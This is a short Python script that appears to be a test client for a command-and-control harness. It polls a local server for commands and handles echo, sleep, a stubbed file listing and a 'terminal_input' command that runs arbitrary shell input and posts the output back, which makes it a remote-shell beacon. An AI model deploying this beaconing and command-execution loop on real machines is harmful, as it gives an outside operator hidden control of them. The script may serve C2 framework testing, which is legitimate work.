import requests
from time import sleep
import logging
from pexpect import run


MAX_REQUEST_TIMEOUT = 120
HARNESS_STR = "127.0.0.1:5000"


def invalid_cmd(client, args):
    from sys import stderr
    stderr.write("Invalid command {} {}\n".format(client, args))
    stderr.flush()


def control_loop(client_info):
    client = client_info
    looping = True
    retry = 0
    # loop through, GET from server and then act on the command
    while looping:
        try:
            resp = requests.get("http://{}/harness/{}".format(
                HARNESS_STR,
                client),
                timeout=MAX_REQUEST_TIMEOUT
            )
            cmd, args = resp.text.split(",", 1)
            handle_resp(cmd, args, client)
            retry = 0
        except requests.exceptions.ConnectionError:
            sleep(.5)
            retry += 1
            continue
        if retry > 10:
            looping = False


def terminate(client, args):
    SystemExit()


def echo(client, args):
    logging.debug(args)
    requests.post("http://{}/response/{}".format(
        HARNESS_STR,
        client),
        data={"data": args},
        timeout=MAX_REQUEST_TIMEOUT
    )


def go_sleep(client, args):
    sleep(float(args) / 1000.0)


def list_files(client, args):
    requests.post("http://{}/response/{}".format(
        HARNESS_STR,
        client),
        data={"data": "data.txt\nresponse.exe\n"}
    )


def handle_resp(resp, args, client):
    func_ = HANDLER.get(resp, invalid_cmd)
    func_(client, args)

def call_terminal(client, args):
    output = run(args)
    requests.post("http://{}/response/{}".format(
        HARNESS_STR,
        client),
        data={"data": output}
    )

HANDLER = {
    "echo": echo,
    "sleep": go_sleep,
    "terminate": terminate,
    "list_files": list_files,
    "terminal_input": call_terminal
}


if __name__ == "__main__":
    client_info = "C_127.0.0.1_1"
    control_loop(client_info)
